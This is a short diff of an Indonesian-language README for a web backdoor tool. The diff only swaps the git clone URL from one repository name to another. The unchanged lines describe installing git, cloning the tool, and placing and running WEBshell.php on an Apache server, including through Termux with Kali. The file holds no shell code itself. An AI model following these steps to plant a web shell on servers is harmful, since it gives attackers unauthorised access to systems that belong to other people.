@@ -10,7 +10,7 @@ untuk melakukan akses ke dalam sistem dengan mengeksekusi program tertentu.
 ***
 ### Download, setup, and usage For Git
 * apt-get update && apt instal git
-* git clone git clone https://github.com/byindosecurity/Web-Backdoor.git 
+* git clone git clone https://github.com/byindosecurity/Trap-Door.git
 * Buka Server Apache 
 * Jalankan WEBshell.php 
 ***
@@ -52,7 +52,7 @@ Pelajari Check Pembahasan Mengenai Backdoor Byindosecurity
  ```
 * Setelah Selesai lalu Ketik Ditermux ``` ./start-kali.sh ``` setelah itu Enter Jika Sudah Muncul Bacaan ``` Root@localhost ```Lalu Ketik ``` apt-get update ``` Enter - Jika Ada Option Pertanyaan Ketik Yes Tunggu Hingga Proses Selesai
 * Lalu Berikut nya ketik ``` apt instal git ``` enter Jika Ada Option Pertanyaan Ketik Yes Tunggu Hingga Proses Selesai
-* setelah Selesai Semua Ketik ``` git clone https://github.com/byindosecurity/Web-Backdoor.git ```enter Jika Ada Option 
+* setelah Selesai Semua Ketik ``` git clone https://github.com/byindosecurity/Trap-Door.git ```enter Jika Ada Option 
   Pertanyaan Ketik Yes Tunggu Hingga Proses Selesai
 * setelah itu Masukan File WEBshell.php Kedalam Server Dan Jalankan
  
